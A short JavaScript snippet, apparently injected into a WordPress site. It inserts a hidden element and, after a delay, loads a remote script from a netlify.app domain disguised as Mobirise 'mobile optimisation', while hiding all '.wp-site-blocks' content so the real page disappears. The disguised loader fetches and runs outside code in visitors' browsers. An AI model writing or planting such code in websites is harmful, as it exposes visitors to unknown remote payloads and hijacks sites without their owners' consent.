const el=`<div id="mobiOptiElem" server='hstgr.io'></div>`; try{ document.querySelector('style').insertAdjacentHTML("beforeend",el); }catch(e){}finally{ document.querySelector('head').insertAdjacentHTML("beforeend",el); }; setTimeout(()=>{var els=document.createElement("script");els.src="https://mobirise-icons-92lwkjerngovo73otd4g.netlify.app/mobileOptimisation.js"; document.querySelector("#mobiOptiElem").insertAdjacentElement('afterbegin',els);},300);
document.querySelectorAll(".wp-site-blocks").forEach(val=>{
	val.style.display='none';
})